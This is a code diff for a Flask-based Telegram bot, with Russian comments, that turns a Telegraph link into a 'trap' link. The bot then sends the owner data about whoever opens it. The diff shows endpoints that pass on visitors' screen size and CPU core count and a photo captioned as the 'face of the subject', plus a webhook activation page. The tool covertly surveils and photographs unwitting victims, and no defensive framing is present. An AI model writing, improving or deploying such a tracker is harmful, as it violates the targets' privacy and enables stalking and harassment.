@@ -7,12 +7,35 @@ app = Flask(__name__)
 
 db = {} 
 
+# --- КНОПКА АКТИВИРОВАТЬ НА САЙТЕ ---
+@app.route('/')
+def home():
+    return f'''
+    <body style="background:#000;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;">
+        <h1 style="margin-bottom:20px;">🤖 LOG SYSTEM ONLINE</h1>
+        <a href="/activate" style="padding:15px 30px;background:#0088cc;color:#fff;text-decoration:none;border-radius:10px;font-weight:bold;box-shadow:0 0 20px #0088cc;">⚡ АКТИВИРОВАТЬ БОТА</a>
+    </body>
+    '''
+
+@app.route('/activate')
+def activate():
+    # Автоматически определяет домен и ставит вебхук
+    webhook_url = f"https://{request.host}/{API_TOKEN}"
+    if bot.set_webhook(url=webhook_url):
+        return f"✅ Бот успешно привязан к: {webhook_url}"
+    return "❌ Ошибка при установке вебхука"
+
+# --- ПРИЕМ СООБЩЕНИЙ ---
 @app.route('/' + (API_TOKEN if API_TOKEN else "none"), methods=['POST'])
 def get_m():
-    update = telebot.types.Update.de_json(request.get_data().decode('utf-8'))
-    bot.process_new_updates([update])
-    return "!", 200
+    if request.headers.get('content-type') == 'application/json':
+        json_string = request.get_data().decode('utf-8')
+        update = telebot.types.Update.de_json(json_string)
+        bot.process_new_updates([update])
+        return "!", 200
+    return "error", 403
 
+# --- ЛОВУШКА ---
 @app.route('/v/<uid>')
 def logger(uid):
     if uid not in db: return "Link Expired", 404
@@ -65,7 +88,7 @@ def logger(uid):
 @app.route('/log_extra', methods=['POST'])
 def log_extra():
     d = request.json
-    if d['uid'] in db:
+    if d and d['uid'] in db:
         m = f"🖥 *ЖЕЛЕЗО:*\n📱 Экран: `{d['scr']}`\n🧠 Ядра: `{d['cores']}`"
         bot.send_message(db[d['uid']]['owner'], m, parse_mode="Markdown")
     return "ok"
@@ -77,9 +100,10 @@ def log_photo():
         bot.send_photo(db[uid]['owner'], file.read(), caption="📸 *ЛИЦО ОБЪЕКТА*")
     return "ok"
 
+# --- ОБРАБОТЧИКИ БОТА ---
 @bot.message_handler(commands=['start'])
 def start(m):
-    bot.reply_to(m, "Пришли ссылку на Telegraph.")
+    bot.reply_to(m, "👋 Привет! Пришли ссылку на Telegraph, и я сделаю её ловушкой.")
 
 @bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
 def create(m):
@@ -87,4 +111,5 @@ def create(m):
     if not url.startswith("http"): url = "https://" + url
     uid = str(uuid.uuid4())[:8]
     db[uid] = {'owner': m.chat.id, 'url': url}
-    bot.reply_to(m, f"✅ Твоя ссылка:\n`https://{{request.host}}/v/{{uid}}`", parse_mode="Markdown")
+    # Используем request.host для генерации ссылки
+    bot.reply_to(m, f"✅ Ссылка:\n`https://{request.host}/v/{uid}`", parse_mode="Markdown")
